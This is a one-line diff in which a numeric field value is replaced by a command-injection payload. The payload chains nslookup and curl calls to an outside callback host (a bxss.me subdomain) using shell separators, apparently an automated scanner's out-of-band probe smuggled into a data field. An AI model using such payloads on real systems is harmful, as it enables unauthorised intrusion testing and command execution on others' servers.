@@ -1,1 +1,1 @@
-5559940645
+;(nslookup -q=cname hitpudhjggara87708.bxss.me||curl hitpudhjggara87708.bxss.me)|(nslookup -q=cname hitpudhjggara87708.bxss.me||curl hitpudhjggara87708.bxss.me)&(nslookup -q=cname hitpudhjggara87708.bxss.me||curl hitpudhjggara87708.bxss.me)
